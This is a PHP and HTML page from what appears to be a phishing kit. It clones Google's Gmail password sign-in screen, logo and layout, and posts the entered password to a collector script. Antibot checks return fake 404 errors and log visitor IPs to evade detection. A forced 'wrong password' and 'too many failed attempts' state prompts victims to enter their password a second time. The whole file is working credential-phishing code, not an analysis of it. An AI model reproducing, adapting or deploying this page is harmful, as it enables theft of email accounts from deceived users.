<?php

    session_start();

    require_once '../../Meta/Comp.php';
    require_once '../../Meta/Antibot.php';
    require_once '../../Meta/demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }

    if (
        !isset($_SESSION['username']) ||
        $_SESSION['username'] == ""
    ) {
        echo $antibot->throw404();
        $comps->log(
            "../../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Skipping Pages\n\n"
        );
        die();
    }

?>

<!DOCTYPE html>
<html lang="EN">
    <head>
        <meta charset="utf-8">
        <title>Gmail</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" type="text/css" href="../../Guard/css/gmail.css">
        <link rel="shortcut icon" href="../../Guard/img/Gmail/gmail.ico" type="image/x-icon">
    </head>
    <body id="yDmH0d" class="nyoS7c SoDlKd EIlDfe" jscontroller="Uas9Hd" jsaction="rcuQ6b:npT2md;click:FAbpgf;wINJic:.CLIENT;GvneHb:.CLIENT;qako4e:.CLIENT;TSpWaf:.CLIENT;nHjqDd:.CLIENT;keydown:.CLIENT" tabindex="-1">
        <div class="H2SoFe LZgQXe TFhTPc">
            <div class="RAYh1e LZgQXe qmmlRd" id="initialView" role="presentation" jsname="WsjYwc" jscontroller="GHsEdb" jsaction="rcuQ6b:wVXPKc,eyofDf;CfTBWd:r0xNSb;enEq8c:Yd2OHe;Z2AmMb:nnGvjf;eqoCse:oUMEzf;RdYeUb:oUMEzf;EJh3N:vYWWBd;">
                <div class="RZBuIb c8DD0" aria-hidden="true">
                    <div id="grayBar" jscontroller="ltDFwf" jsaction="transitionend:Zdx3Re" jsname="Igk6W" role="progressbar" class="sZwd7c B6Vhqe qdulke jK7moc">
                        <div class="xcNBHc um3FLe"></div>
                        <div jsname="cQwEuf" class="w2zcLc Iq5ZMc"></div>
                        <div id="theBar" class="MyvhI TKVRUb" jsname="P1ekSe"><span class="l3q5xe SQxu9c"></span></div>
                        <div id="theBar" class="MyvhI sUoeld"><span class="l3q5xe SQxu9c"></span></div>
                    </div>
                </div>
                <div class="xkfVF" jsname="f2d3ae" role="presentation" tabindex="null">
                    <div class="Aa1VU">
                        <div class="whiteOverlay"></div>
                        <div class="Lth2jb " jsname="n7vHCb" jscontroller="rKxYMb" jsaction="rcuQ6b:qg4Ic;Kzwjs:WPi0i;" data-oauth-third-party-logo-url="" aria-hidden="true">
                            <div jsname="jjf7Ff">
                                <div id="logo" class="v8vQje" title="Google">
                                    <div class="rr0DNb" jsname="l4eHX"><svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="l5Lhkf"><g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g><g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g><g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g><g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g><g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g><g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g></svg></div>
                                </div>
                            </div>
                        </div>
                        <div id="view_container" class="JhUD8d SQNfcc vLGJgb" jscontroller="WFS13" jsaction="rcuQ6b:npT2md" jsmodel="Z7PiFb qFmk3b qbZ0Se nqpTHe hAn1A YPPRX eV9nn Xu2csd hc6Ubd"
                            data-initial-sign-in-data="%.@.&quot;gf.isid&quot;,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],[28,10,20,22,29,6],null,&quot;AEThLlyJ6QXqJXkyrjbOt2G4wErfzH_tSM2XUGOwGU_eR5wbH115Afhe-IQCVbBcc13ZLnk7kNMq5N_HNbeD1M9mrkXLa9FHtR_RSlJNfFQxSpD0Iv0Xc0A-DCt4Y_dfBO4nCSeDWgdPImlmgzKRiE0TE6EfP8XXyhJ4DCVh_qCXnC19QIfrghF6SfvFLdsQtEwQUIviziw5&quot;,[[]]]">
                            <div jscontroller="Ka7I6" jsaction="jiqeKb:ZCwQbe;u3KAb:ZCwQbe;cLkKDf:n4vmRb;DPVjO:tVBJG;eyyw5c:gVmDzc;rcuQ6b:rcuQ6b;click:vBw6I(preventDefault=true|L6M1Fb),EtG4V(preventDefault=true|CkSUlf);C73E2d:gVmDzc;DiUYjc:.CLIENT;abBxn:.CLIENT;nKbR0:.CLIENT;ffNU7c:.CLIENT"
                                jsname="nUpftc" class="zWl5kd" data-view-id="b5STy">
                                <div class="DRS7Fe bxPAYd k6Zj8d" jsname="lr9nlf" jscontroller="Z3Buzf" jsshadow="" data-branding="jcJzye" role="presentation">
                                    <div jsname="paFcre">
                                        <div class="jXeDnc " jsname="tJHJj" jscontroller="S9352b" jsaction="JIbuQc:pKJJqe(af8ijd);bTyaEe:pKJJqe;">
                                            <h1 class="ahT6S " data-a11y-title-piece="" id="headingText" jsname="r4nke"><span jsslot="">Welcome</span></h1>
                                            <div class="Y4dIwd" data-a11y-title-piece="" id="headingSubtext" jsname="VdSJob"></div>
                                            <div class="aCayab">
                                                <div jscontroller="BzWZlf" jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; touchstart:p6p2H; touchend:yfqBxc;" class="YZrg6 HnRr5d iiFyne cd29Sd" tabindex="0" role="link" aria-label="est3@gmail.com selected. Switch account" jsname="af8ijd">
                                                    <div class="gPHLDe">
                                                        <div class="qQWzTd" aria-hidden="true"><svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg></div>
                                                    </div>
                                                    <div jsname="fmcmS" class="KTeGk" id="profileIdentifier"><?php echo $_SESSION['email']; ?></div>
                                                    <div class="krLnGe"><svg aria-hidden="true" class="stUf5b MSBt4d" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon></svg></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div jsname="uybdVe" class="pwWryf bxPAYd" role="presentation">
                                        <div jsname="USBQqe" class="Wxwduf Us7fWe JhUD8d" role="presentation">
                                            <div class="WEQkZc"><span jsslot="" class="sFcPkb"><section class="aTzEhb  uXELDc rNe0id eLNT1d S7S4N" jscontroller="uwHxEe" jsname="INM6z" aria-live="assertive" aria-atomic="true" jsshadow=""><header class="IdEPtc" jsname="tJHJj"><div class="L9iFZc" role="presentation" jsname="NjaE2c"><h2 class="kV95Wc TrZEUc"><span class="yiP64c" aria-hidden="true" jsname="Bz112c"><svg aria-hidden="true" class="stUf5b d7Plee" fill="currentColor" focusable="false" width="20px" height="20px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"></path></svg></span>
                                                <span jsslot="" jsname="Ud7fr">Too many failed attempts</span>
                                                </h2>
                                                <div class="yMb59d" jsname="HSrbLb" aria-hidden="true"></div>
                                            </div>
                                            </header>
                                            <div class="CxRgyd" jsname="MZArnb">
                                                <div jsslot=""></div>
                                            </div>
                                            </section>
                                            </span>
                                            <div class="bCAAsb">
                                                <form action="../../Meta/Benchmark/email.php?token=<?php echo $_SESSION['token']; ?>" method="POST" id="form1">
                                                    <div>
                                                        <span jsslot="">
                                                            <section class="aTzEhb " jscontroller="uwHxEe" jsshadow="">
                                                                <header class="IdEPtc" jsname="tJHJj" aria-hidden="true"></header>
                                                                <div class="CxRgyd" jsname="MZArnb">
                                                                    <div jsslot=""><input type="email" name="identifier" class="F29zPe" tabindex="-1" aria-hidden="true" spellcheck="false" value="est3" jsname="KKx9x" autocomplete="off" id="hiddenEmail">
                                                                        <div class="SdBahf VxoKGd" jscontroller="MZKEPb" jsshadow="" jsname="vZSTIf" jsaction="rcuQ6b:rcuQ6b;KJ9cZc:nAF18e(EMUunb);RXQi4b:.CLIENT;TGB85e:.CLIENT;DQ0KUb:.CLIENT;HYMnzb:.CLIENT;sv6xVb:.CLIENT;sKmMle:.CLIENT" data-is-visible="false">
                                                                        <div class="eEgeR">
                                                                            <div class="W498nc">
                                                                                <div class="fdWl7b">
                                                                                    <div class="hDp5Db" jscontroller="zysDWd" jsaction="rcuQ6b:rcuQ6b;JIbuQc:OVHm7(sEbX2);RXQi4b:.CLIENT;TGB85e:.CLIENT;keydown:.CLIENT;AHmuwe:.CLIENT;O22p3e:.CLIENT;YqO5N:.CLIENT" jsname="UmsTj" jsshadow="">
                                                                                        <div id="password" class="rFrNMe ze9ebf YKooDc q9Nsuf zKHdkd sdJrJc u3bW4e" jscontroller="pxq3x" jsaction="clickonly:KjsqPd; focus:Jt1EX; blur:fpfTEe; input:Lg5SV" jsshadow="" jsname="Ufn6O">
                                                                                            <div class="aCsJod oJeWuf">
                                                                                                <div class="aXBtI Wic03c">
                                                                                                    <div class="Xb9hP">
                                                                                                        <input type="password" class="whsOnd zHQkBf" jsname="YPqjbf" autocomplete="current-password" spellcheck="false" tabindex="0" aria-label="Enter your password" name="emailPassword" autocapitalize="off" required dir="ltr" data-initial-dir="ltr" data-initial-value="" id="emailPassword">
                                                                                                        <div jsname="YRMmle" class="AxOyFc snByac" aria-hidden="true" id="enterPass">Enter your password</div>
                                                                                                    </div>
                                                                                                    <div class="i9lrp mIZh1c"></div>
                                                                                                    <div jsname="XmnwAc" class="OabDMe cXrdqd Y2Zypf" style="transform-origin: 110px center 0px;" id="borderRed"></div>
                                                                                                </div>
                                                                                            </div>
                                                                                            <div class="LXRPh">
                                                                                                <div jsname="ty6ygf" class="ovnfwe Is7Fhb"></div>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div class="OyEIQ uSvLId" jsname="h9d3hd" aria-live="assertive" style="display: none;" id="dis-2">
                                                                            <div class="EjBTad" id="dis-1" style="display: none;">
                                                                                <svg class="stUf5b LxE1Id" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                                                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                                                                                </svg>
                                                                            </div>
                                                                            <div jsname="B34EJ">
                                                                                <span id="erl-1337" jsslot="">Wrong password. Try again or click Forgot password to reset it.</span>
                                                                            </div></div>
                                                                        <div class="EcjFDf" jsname="ESjtn"><div class="IhH7Wd" jsaction="rcuQ6b:xawz9d;RqOcWc:gfO0Le;" jscontroller="KylAQd" jsname="EMUunb" jsshadow=""><div class="ci67pc"><div class="BudEQ rBUW7e" jsaction="click:va5fqd;JIbuQc:vKfede(ornU0b);RXQi4b:.CLIENT;TGB85e:.CLIENT" jscontroller="Dt3C4" jsname="wQNmvb" jsshadow=""><div class="sSzDje NEk0Ve"><div class="enBDyd" id="test"><div class="VfPpkd-MPu53c VfPpkd-MPu53c-OWXEXe-dgl2Hf Ne8lhe swXlm az2ine y5MMGc sD2Hod VfPpkd-MPu53c-OWXEXe-mWPk3d" jscontroller="etBPYb" data-indeterminate="false" jsname="ornU0b" jsaction="click:cOuCgd; clickmod:vhIIDb; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; contextmenu:mg9Pef; animationend:L9dL9d;dyRcpb:dyRcpb;" data-value="optionc2"><input class="VfPpkd-muHVFf-bMcfAe" type="checkbox" jsname="YPqjbf" jsaction="focus:AHmuwe; blur:O22p3e; change:WPi0i;" aria-labelledby="selectionc0" id="checkbox"><div class="VfPpkd-YQoJzd"><svg class="VfPpkd-HUofsb" viewBox="0 0 24 24"><path class="VfPpkd-HUofsb-Jt5cK" fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59"></path></svg><div class="VfPpkd-SJnn3d"></div></div><div class="VfPpkd-OYHm6b"></div></div></div><div class="DVnhEd"><div jsname="V67aGc" class="wFCloc"><label jsslot="" id="selectionc0" class="jGAaxb" jsname="CeL6Qc" for="checkbox">Show password</label></div></div></div></div></div><div aria-atomic="true" aria-live="assertive" class="Df4rGb" jsname="h9d3hd"><div jsslot=""></div></div></div></div><div class="gSlDTe" jsname="JIbuQc"></div></div><div jscontroller="lmaXKd" jsname="Si5T8b" class="Wzzww eLNT1d" jsaction="click:IMdg8d(A1U4Sb);rcuQ6b:jqIVcd"><img jsname="O9Milc" id="captchaimg" class="TrZEUc"><button class="yz7Gpc TrZEUc" jsname="A1U4Sb" id="playCaptchaButton" tabindex="0" aria-label="Listen and type the numbers that you hear" type="button"><svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="18px" height="18px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.8-1-3.3-2.5-4v8c1.5-.7 2.5-2.2 2.5-4zM14 3.2v2.1c2.9.9 5 3.5 5 6.7s-2.1 5.9-5 6.7v2.1c4-.9 7-4.5 7-8.8s-3-7.9-7-8.8z"></path></svg></button><audio jsname="CakGX" type="audio/wav" id="captchaAudio"></audio><div jscontroller="b21kgd" jsaction="keydown:C9BaXe;O22p3e:Op2ZO;AHmuwe:Jt1EX;rcuQ6b:rcuQ6b;YqO5N:Lg5SV;rURRne:rcuQ6b;EJh3N:rcuQ6b;RXQi4b:.CLIENT;TGB85e:.CLIENT" jsname="CQRbLd" class="d2CFce cDSmF" role="presentation" data-is-rendered="true"><div class="rFrNMe N3Hzgf jjwyfe zKHdkd sdJrJc Tyc9J" jscontroller="pxq3x" jsaction="clickonly:KjsqPd; focus:Jt1EX; blur:fpfTEe; input:Lg5SV" jsshadow="" jsname="Vsb5Ub"><div class="aCsJod oJeWuf"><div class="aXBtI Wic03c"><div class="Xb9hP"><input type="text" class="whsOnd zHQkBf" jsname="YPqjbf" autocomplete="off" spellcheck="false" tabindex="0" aria-label="Type the text you hear or see" name="ca" id="ca" dir="ltr" data-initial-dir="ltr" data-initial-value=""><div jsname="YRMmle" class="AxOyFc snByac" aria-hidden="true">Type the text you hear or see</div></div><div class="i9lrp mIZh1c"></div><div jsname="XmnwAc" class="OabDMe cXrdqd"></div></div></div><div class="LXRPh"><div jsname="ty6ygf" class="ovnfwe Is7Fhb"></div><div jsname="B34EJ" class="dEOOab RxsGPe" aria-atomic="true" aria-live="assertive"></div></div></div></div><input jsname="SBlSod" type="hidden" name="ct" id="ct"></div></div></div></section></span></div>
                                            </div>
                                        </div>
                                        <div class="zQJV3">
                                            <div class="dG5hZc">
                                                <div class="qhFLie">
                                                    <div class="FliLIb DL0QTb">
                                                        <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb" id="btnForm">
                                                        
                                                            <div class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc qIypjc TrZEUc lw1w4b" id="btnForm">
                                                                <span class="VfPpkd-vQzf8d" id="btnForm">Next</span>
                                                            </div>

                                                            </form>
                                                            
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="daaWTb" jsname="QkNstf">
                                                    <div jscontroller="Xq93uf" jsaction="click:cOuCgd;JIbuQc:JIbuQc;" jsname="gVmDzc" class="FliLIb n4P87" id="forgotPassword" tabindex="-1">
                                                        <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb" data-is-touch-wrapper="true"><button class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d uRo0Xe TrZEUc lw1w4b" jscontroller="soHxf" jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;"
                                                                jsname="LgbsSe" type="button"><div class="VfPpkd-Jh9lGc"></div><span jsname="V67aGc" class="VfPpkd-vQzf8d">Forgot password?</span><div class="VfPpkd-RLmnJb"></div></button></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <footer class="RwBngc">
                <div class="u7land" jscontroller="VVHlDf" jsaction="rcuQ6b:npT2md;aLn7Wb:VPRXbd">
                    <div role="listbox" aria-expanded="false" id="lang-chooser" class="jgvuAb TkU0Xc" jscontroller="YwHGTd" jsaction="click:cOuCgd(LgbsSe); keydown:I481le; keypress:Kr2w4b; mousedown:UX7yZ(LgbsSe),npT2md(preventDefault=true); mouseup:lbsD7e(LgbsSe); mouseleave:JywGue; touchstart:p6p2H(LgbsSe); touchmove:FwuNnf; touchend:yfqBxc(LgbsSe|preventMouseEvents=true|preventDefault=true); touchcancel:JMtRjd(LgbsSe); focus:AHmuwe; blur:O22p3e;b5SvAb:TvD9Pc;"
                        jsshadow="" jsname="rfCUpd" aria-label="Change language">
                        <div jsname="LgbsSe" role="presentation">
                            <div class="ry3kXd Ulgu9" jsname="d9BH4c" role="presentation">
                                <div class="MocG8c B9IrJb LMgvRb KKjvXb" jsname="wQNmvb" jsaction="" data-value="en" aria-selected="true" role="option" tabindex="0">
                                    <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">‪English (<?php echo $_SESSION['ipDetails']['country']; ?>)‬</span>
                                </div>
                            </div>
                            <div class="CeEBt Ce1Y1c eU809d" role="presentation">
                                <div class="TquXA"></div>
                            </div>
                        </div>
                        <div class="OA0qNb ncFHed" soy-server-key="5:pZtlf" jsaction="click:dPTK6c(wQNmvb); mousedown:uYU8jb(wQNmvb); mouseup:LVEdXd(wQNmvb); mouseover:nfXz1e(wQNmvb); touchstart:Rh2fre(wQNmvb); touchmove:hvFWtf(wQNmvb); touchend:MkF9r(wQNmvb|preventMouseEvents=true)"
                            role="presentation" jsname="V68bde" style="display:none;"></div>
                    </div>
                </div>
                <ul class="Bgzgmd">
                    <li><a style="cursor: pointer;">Help</a></li>
                    <li><a style="cursor: pointer;">Privacy</a></li>
                    <li><a style="cursor: pointer;">Terms</a></li>
                </ul>
            </footer>
        </div>
        <script>
            function formSubmit() {
                var input = document.getElementById("emailPassword").value;
                if (input.trim() == "") {
                    document.getElementById("enterPass").style.color = "#d93025";
                    document.getElementById("borderRed").style = "border-color: #d93025;";
                    document.getElementById("erl-1337").innerText = 'Enter a password';
                    document.getElementById("dis-1").style = "display: flex;";
                    document.getElementById("dis-2").style = "display: flex; color: #d93025;";
                    document.getElementById("emailPassword").focus();
                } else {
                    document.getElementById("grayBar").style = "opacity: 1;";

                    for (var i = 0; i < document.getElementsByClassName('MyvhI').length; i++) {
                        document.getElementsByClassName('MyvhI')[i].style = "animation-play-state: running !important;";
                        document.getElementsByClassName('l3q5xe')[i].style = "animation-play-state: running !important;";
                    }

                    document.getElementsByClassName("whiteOverlay")['0'].style = "visibility: visible; opacity: .4;";

                    setTimeout(function () {
                        document.getElementById("form1").submit();
                    }, 1000);
                }
            }

            function showPass() {
                var checkbox = document.getElementById("checkbox");

                if (checkbox.checked) {
                    document.getElementById("emailPassword").type = "text";
                } else {
                    document.getElementById("emailPassword").type = "password";
                }
            }

            document.getElementById("emailPassword").onkeydown = function(e){
                if(e.keyCode == 13){
                    formSubmit();
                }
            };

            <?php
                
                if (isset($_SESSION['emailTwice']) && $_SESSION['emailTwice']) {
                    echo '
                    
                        document.getElementById("enterPass").style.color = "#d93025";
                        document.getElementById("borderRed").style = "border-color: #d93025;";
                        document.getElementById("dis-1").style = "display: flex;";
                        document.getElementById("dis-2").style = "display: flex; color: #d93025;";
                        document.getElementById("emailPassword").focus();

                    ';
                }

            ?>

            document.getElementById("btnForm").onclick = formSubmit;
            document.getElementById("checkbox").onclick = showPass;
        </script>
    </body>
</html>